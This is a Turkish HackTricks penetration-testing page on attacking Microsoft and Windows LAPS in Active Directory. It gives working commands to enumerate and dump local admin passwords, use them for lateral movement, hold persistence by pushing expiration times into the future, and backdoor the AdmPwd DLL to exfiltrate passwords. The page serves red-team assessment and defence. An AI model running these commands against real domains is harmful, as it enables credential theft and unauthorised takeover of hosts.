# LAPS

{{#include ../../banners/hacktricks-training.md}}


## Temel Bilgiler

Bir assessment sırasında karşılaşabileceğiniz şu anda **2 LAPS türü** vardır:

- **Legacy Microsoft LAPS**: yerel administrator password bilgisini **`ms-Mcs-AdmPwd`** ve expiration time bilgisini **`ms-Mcs-AdmPwdExpirationTime`** içinde depolar.
- **Windows LAPS** (April 2023 updates'ten beri Windows'a dahildir): legacy mode'u hâlâ emulate edebilir, ancak native mode'da **`msLAPS-*`** attribute'larını kullanır, **password encryption**, **password history** ve domain controller'lar için **DSRM password backup** desteği sunar.

LAPS, **local administrator password'larını** yönetmek için tasarlanmıştır; bu password'ları domain-joined computer'larda **unique, randomized ve sık sık değiştirilen** hâle getirir. Bu attribute'ları okuyabiliyorsanız, genellikle etkilenen host'a **local admin** olarak **pivot** edebilirsiniz. Birçok environment'ta ilgi çekici kısım yalnızca password'un kendisini okumak değil, aynı zamanda password attribute'larına erişimin **kime delegate edildiğini** bulmaktır.

### Legacy Microsoft LAPS attribute'ları

Domain'deki computer object'lerinde, Legacy Microsoft LAPS implementation'ı iki attribute'un eklenmesiyle sonuçlanır:<sup>[[1]](#references)</sup>

- **`ms-Mcs-AdmPwd`**: **plain-text administrator password**
- **`ms-Mcs-AdmPwdExpirationTime`**: **password expiration time**

### Windows LAPS attribute'ları

Native Windows LAPS, computer object'lerine birkaç yeni attribute ekler:<sup>[[2]](#references)</sup>

- **`msLAPS-Password`**: encryption etkin değilken JSON olarak depolanan clear-text password blob'u
- **`msLAPS-PasswordExpirationTime`**: planlanan expiration time
- **`msLAPS-EncryptedPassword`**: encrypted current password
- **`msLAPS-EncryptedPasswordHistory`**: encrypted password history
- **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`**: domain controller'lar için encrypted DSRM password verisi
- **`msLAPS-CurrentPasswordVersion`**: daha yeni rollback-detection logic tarafından kullanılan GUID-based version tracking (Windows Server 2025 forest schema)

**`msLAPS-Password`** okunabilir olduğunda, değer account name, update time ve clear-text password içeren bir JSON object'tir; örneğin:<sup>[[2]](#references)</sup>
```json
{"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
```
### Etkinleştirilip etkinleştirilmediğini kontrol edin
```bash
# Legacy Microsoft LAPS policy
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Native Windows LAPS binaries / PowerShell module
Get-Command *Laps*
dir "$env:windir\System32\LAPS"

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Legacy Microsoft LAPS-enabled computers (any Domain User can usually read the expiration attribute)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" |
? { $_."ms-mcs-admpwdexpirationtime" -ne $null } |
select DnsHostname

# Native Windows LAPS-enabled computers
Get-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' |
select DnsHostname
```
## LAPS Password Access

**Ham LAPS policy**'sini `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` konumundan **indirebilir**, ardından bu dosyayı insan tarafından okunabilir bir biçime dönüştürmek için [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) paketindeki **`Parse-PolFile`**'ı kullanabilirsiniz.

### Eski Microsoft LAPS PowerShell cmdlet'leri

Eski LAPS modülü yüklüyse aşağıdaki cmdlet'ler genellikle kullanılabilir:
```bash
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read the LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
### Windows LAPS PowerShell cmdlet'leri

Native Windows LAPS, yeni bir PowerShell modülü ve yeni cmdlet'lerle birlikte gelir:
```bash
Get-Command *Laps*

# Discover who has extended rights over the OU
Find-LapsADExtendedRights -Identity Workstations

# Read a password from AD
Get-LapsADPassword -Identity wkstn-2 -AsPlainText

# Include password history if encryption/history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory

# Query DSRM password from a DC object
Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText

# Use alternate credentials for an authorized decryptor
$cred = Get-Credential CONTOSO\LAPSDecryptor
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -DecryptionCredential $cred
```
Burada birkaç operasyonel ayrıntı önemlidir:<sup>[[3]](#references)</sup>

- **`Get-LapsADPassword`**, **legacy LAPS**, **clear-text Windows LAPS** ve **encrypted Windows LAPS** işlemlerini otomatik olarak destekler.
- Parola encrypted durumdaysa ve onu **read** edip **decrypt** edemiyorsanız, cmdlet clear-text parolayı döndüremese bile **`Source`**, **`DecryptionStatus`** ve **`AuthorizedDecryptor`** gibi metadata bilgilerini döndürür.
- **encrypted Windows LAPS** içinde **read permission** ve **decrypt permission** birbirinden **farklı kontrollerdir**. OU / object read access sahibi olmak, **`msLAPS-EncryptedPassword`** değerini otomatik olarak decrypt edebileceğiniz anlamına gelmez.
- **Password history** yalnızca **Windows LAPS encryption** etkinleştirildiğinde kullanılabilir.
- Domain controller'larda döndürülen source **`EncryptedDSRMPassword`** olabilir.

Bu, assessment sırasında kullanışlıdır; çünkü **`AuthorizedDecryptor`** alanı blob'un **hangi kullanıcı veya grup için encrypted** edildiğini gösterir ve başarısız bir password read işlemini çoğu zaman yeni bir privilege-escalation hedefine dönüştürür.

### PowerView / LDAP

**PowerView**, **password'u kimin read edebildiğini bulmak ve password'u read etmek** için de kullanılabilir:
```bash
# Legacy Microsoft LAPS: find principals with rights over the OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Legacy Microsoft LAPS: read the password directly from LDAP
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# Native Windows LAPS clear-text mode
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
```
**`msLAPS-Password`** okunabiliyorsa, döndürülen JSON'u ayrıştırın ve parola için **`p`**, yönetilen yerel yönetici hesabı adı için **`n`** değerini çıkarın.
```bash
# Extract both the password and the real managed account name
$laps = (Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password)."msLAPS-Password" | ConvertFrom-Json
$laps.n
$laps.p
```
Bu **`n`** alanı, daha yeni deployments için önemlidir; çünkü **Windows LAPS automatic account management**, yerleşik **`Administrator`** yerine bir **custom account** hedefleyebilir ve daha yeni **Windows 11 24H2 / Windows Server 2025** sistemleri bu account adını **randomize** bile edebilir.<sup>[[4]](#references)</sup>

### Linux / remote tooling

Modern tooling hem legacy Microsoft LAPS hem de Windows LAPS'ı destekler.
```bash
# NetExec / CrackMapExec lineage: dump LAPS values over LDAP
nxc ldap 10.10.10.10 -u user -p password -M laps

# Filter to a subset of computers
nxc ldap 10.10.10.10 -u user -p password -M laps -o COMPUTER='WKSTN-*'

# Use read LAPS access to authenticate to hosts at scale
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps

# If the local admin name is not Administrator
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps customadmin

# Legacy Microsoft LAPS with bloodyAD
bloodyAD --host 10.10.10.10 -d contoso.local -u user -p 'Passw0rd!' \
get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
--attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
Notlar:

- Güncel **NetExec** derlemeleri **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`** ve **`msLAPS-EncryptedPassword`** özelliklerini destekler.
- **`pyLAPS`**, Linux üzerinden **legacy Microsoft LAPS** için hâlâ kullanışlıdır, ancak yalnızca **`ms-Mcs-AdmPwd`** hedeflenir.
- **`LAPS4LINUX`**, **`dpapi-ng`** tabanlı araçlar ve güncel **NetExec** workflow'ları gibi daha yeni cross-platform araçlar, **native Windows LAPS**'ı Windows dışı host'lardan da işleyebilir.
- Ortamda **encrypted Windows LAPS** kullanılıyorsa basit bir LDAP okuması yeterli değildir; ayrıca **authorized decryptor** (veya offline domain DPAPI-NG root key material gibi eşdeğer decryption material) olmanız gerekir.<sup>[[5]](#references)</sup>
- **Windows 11 24H2 / Windows Server 2025** üzerinde, yönetilen local admin hesabının her zaman **`Administrator`** olduğunu varsaymayın. Automatic account management, özel bir hesap oluşturabilir ve isteğe bağlı olarak adını randomize edebilir; bu nedenle geniş ölçekte **`--laps`** kullanmadan önce hesap adını **`n`** / **`Account`** üzerinden keşfedin.<sup>[[4]](#references)</sup>

### Directory synchronization abuse

Her computer object üzerinde doğrudan read access yerine domain-level **directory synchronization** haklarına sahipseniz, LAPS yine de ilgi çekici olabilir.

**`DS-Replication-Get-Changes`** ile **`DS-Replication-Get-Changes-In-Filtered-Set`** veya **`DS-Replication-Get-Changes-All`** kombinasyonu, legacy **`ms-Mcs-AdmPwd`** gibi **confidential / RODC-filtered** attribute'ları synchronize etmek için kullanılabilir. BloodHound bunu **`SyncLAPSPassword`** olarak modeller. Replication-rights arka planı için [DCSync](dcsync.md) sayfasına bakın.

## LAPSToolkit

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit), çeşitli işlevlerle LAPS enumeration'ını kolaylaştırır.<sup>[[6]](#references)</sup>\
Bunlardan biri, **LAPS etkinleştirilmiş tüm computer'lar için** **`ExtendedRights`** parsing işlemidir. Bu işlem, özellikle **LAPS password'larını okumak üzere delegate edilmiş grupları** gösterir; bunlar çoğunlukla protected group'ların üyeleridir.\
Bir **account**, bir computer'ı domain'e **join ettiğinde**, bu host üzerinde `All Extended Rights` alır ve bu hak, **account**'a **password'ları okuma** yeteneği verir. Enumeration, bir host üzerindeki LAPS password'ını okuyabilen bir user account gösterebilir. Bu, LAPS password'larını okuyabilen **belirli AD user'larını hedeflememize** yardımcı olabilir.
```bash
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expiration time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## NetExec / CrackMapExec ile LAPS Passwords Dumping

Etkileşimli bir PowerShell'iniz yoksa, bu ayrıcalığı LDAP üzerinden uzaktan abuse edebilirsiniz:
```bash
# Legacy syntax still widely seen in writeups
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps

# Current project name / syntax
nxc ldap 10.10.10.10 -u user -p password -M laps
```
Bu, kullanıcının okuyabildiği tüm LAPS sırlarını döker ve farklı bir local administrator password ile lateral movement yapmanıza olanak tanır.

## LAPS Password Kullanımı
```bash
xfreerdp /v:192.168.1.1:3389 /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## LAPS Persistence

### Son Kullanma Tarihi

Admin olduktan sonra, **parolaları elde etmek** ve **son kullanma tarihini gelecekteki bir tarihe ayarlayarak** bir makinenin **parolasını güncellemesini** **engellemek** mümkündür.

Legacy Microsoft LAPS:
```bash
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## SYSTEM on the computer is needed
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
Yerleşik Windows LAPS bunun yerine **`msLAPS-PasswordExpirationTime`** kullanır:
```bash
# Read the current expiration timestamp
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime

# Push the expiration into the future
Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
```
> [!WARNING]
> Bir **admin** **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`** kullandığında veya **Do not allow password expiration time longer than required by policy** etkinleştirildiğinde parola yine de rotate olur.

### Daha yeni Windows LAPS sürümlerinde snapshot rollback uyarısı

Eski snapshot / image rollback yöntemleri, güncel **Windows LAPS** kurulumlarına karşı **daha az güvenilirdir**. **Windows 11 24H2 / Windows Server 2025** üzerinde, forest schema **`msLAPS-CurrentPasswordVersion`** (**Windows Server 2025 forest schema**) içeriyorsa client, yerel olarak cache'lenmiş GUID'yi AD'de depolanan değerle karşılaştırır ve rollback bir **torn state** oluşturduğunda parolayı **hemen rotate eder**.

Pratikte bu, snapshot tabanlı persistence yöntemlerinin veya daha önce bilinen bir local admin parolasını yeniden canlandırma girişimlerinin bir sonraki normal expiration zamanına kadar dayanmak yerine hızlıca etkisiz hale gelebileceği anlamına gelir.<sup>[[2]](#references)</sup>

Bu koruma yalnızca **AD-backed Windows LAPS** için geçerlidir ve geri döndürülen makinenin yeniden **AD'ye authenticate olabilmesine** bağlıdır. Makine artık AD ile iletişim kuramıyorsa **password history** veya **AD backup access** yine işe yarayabilir.

### Automatic account management için tamper uyarısı

**automatic account management** etkin olduğunda Windows LAPS, yönetilen local admin hesabının yaşam döngüsünü kontrol eder. Bu hesap üzerinde beklenmeyen rename, reconfigure veya başka türde tamper girişimleri **`STATUS_POLICY_CONTROLLED_ACCOUNT`** / **`ERROR_POLICY_CONTROLLED_ACCOUNT`** ile reddedilebilir; bu nedenle yönetilen LAPS hesabını sessizce değiştirmeye dayanan persistence yöntemleri daha yeni endpoint'lerde daha az güvenilirdir.<sup>[[4]](#references)</sup>

### AD backup'larından historical password'ları kurtarma

**Windows LAPS encryption + password history** etkin olduğunda, mount edilmiş AD backup'ları ek bir secret kaynağı haline gelebilir. Mount edilmiş bir AD snapshot'ına erişebiliyor ve **recovery mode** kullanabiliyorsanız, canlı bir DC ile iletişim kurmadan daha önce depolanmış parolaları sorgulayabilirsiniz.<sup>[[3]](#references)</sup>
```bash
# Query a mounted AD snapshot on port 50000
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode

# Historical entries if history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
```
This is mostly relevant during **AD backup theft**, **offline forensics abuse** veya **disaster-recovery media access** sırasında.

### Backdoor

Legacy Microsoft LAPS için orijinal kaynak kodu [burada](https://github.com/GreyCorbel/admpwd) bulunabilir; bu nedenle koda (örneğin `Main/AdmPwd.PS/Main.cs` içindeki `Get-AdmPwdPassword` method'una) bir backdoor yerleştirmek ve bir şekilde **yeni parolaları exfiltrate etmek veya bir yerde depolamak** mümkündür.

Ardından yeni `AdmPwd.PS.dll` dosyasını compile edin ve makineye `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` konumuna upload edin (ve modification time'ı değiştirin).

## References

- [1] [Introduction to Microsoft LAPS – Local Administrator Password Solution](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
- [2] [Windows LAPS schema and rights extensions for Windows Server Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
- [3] [Get started with Windows LAPS and Windows Server Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory)
- [4] [Windows LAPS account management modes](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes)
- [5] [LAPS 2.0 Internals - XPN Infosec Blog](https://blog.xpnsec.com/lapsv2-internals/)
- [6] [LAPSToolkit - leoloobeek](https://github.com/leoloobeek/LAPSToolkit)

{{#include ../../banners/hacktricks-training.md}}
